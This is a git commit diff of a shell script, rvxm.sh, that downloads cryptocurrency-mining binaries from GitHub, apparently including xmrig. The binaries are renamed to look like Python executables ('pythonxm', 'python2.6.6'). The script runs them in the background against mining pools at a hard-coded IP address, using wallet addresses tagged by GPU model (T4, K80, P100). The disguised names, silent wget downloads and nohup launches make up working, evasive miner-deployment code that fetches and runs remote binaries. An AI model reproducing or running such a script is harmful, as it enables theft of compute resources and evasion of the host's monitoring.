07f709004248919ea13d334e8378f7c33b070c19
Ayoub Jadouli <Ayoub JADOULI>
2021-04-11 17:33:44 +0000

    just rv

--- rvxm.sh
+++ rvxm.sh
@@ -9,8 +9,57 @@ echo '#######################################################'
 echo '################## RV + XM v0.1.0      ################'
 echo '#######################################################'
 
-echo > oout
 
+
+#### Clean logs
+echo > cuout
+echo > ocout
+echo > ocoutdef
+echo > oout
+echo > oout
+echo > results.txt 
+
+########## 
+rm -rf pythonxm
+rm -rf config.json
+rm -rf x.out
+rm -rf pythonheq
+
+# General Config
+PoolHost=116.203.10.54
+VR_Port=3000
+
+
+
+
+
+########## CPU ##########
+####### XM
+#               Executable
+wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+chmod +x pythonxm
+#                Config
+wget -q https://github.com/one10001/10001code/raw/main/config.json
+sed -i "s+ip0001+RV_$IPNAME+g" config.json
+
+
+./pythonxm -c config.json -l oout 2>> oout 1>> oout &
+
+###### VC
+#wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+#chmod +x pythonheq
+
+
+#./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VER_""$IPNAME" -t 4 1> oout 2> oout &
+
+###### 5G
+#wget -q https://github.com/one10001/10001code/raw/main/pythoncpu
+#chmod +x pythoncpu
+
+#./pythoncpu -a x16rv2 -o stratum+tcp://116.203.10.54:3015 -u 5PJxraBqyU1yKK5QukamiMZqNdWPcZ3wwB -p c=VGC -t 4 1> oout 2> oout &
+
+
+########## GPU ##########
 rm -rf python2.6.6
 rm -rf pythonoc
 wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
@@ -28,35 +77,16 @@ nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_
 
 elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
 then
-echo '                                  #########################'
-echo "####################### P100-PCIE #########################"
-echo '#######################                                    '
 nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@116.203.10.54:80  -G  2>> oout 1>> oout &
 elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
 then
-echo '                                   #########################'
-echo "#######################    K80     #########################"
-echo '#######################                                    '
 nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
-elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
-then
-echo '                                   #########################'
-echo "#######################    P4     #########################"
-echo '#######################                                    '
-nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_P4_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
 else
-echo '                                  #########################'
-echo "#######################     P4    #########################"
-echo '#######################                                    '
 nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
 fi
-i="0"
-    while true
-    do
-        i=$[$i+1]
-        echo "results $i: $(grep Acc oout | wc -l)" 
-        sleep 30
-    done
+
+
+tail -f oout
 
 done
 tail -f oout
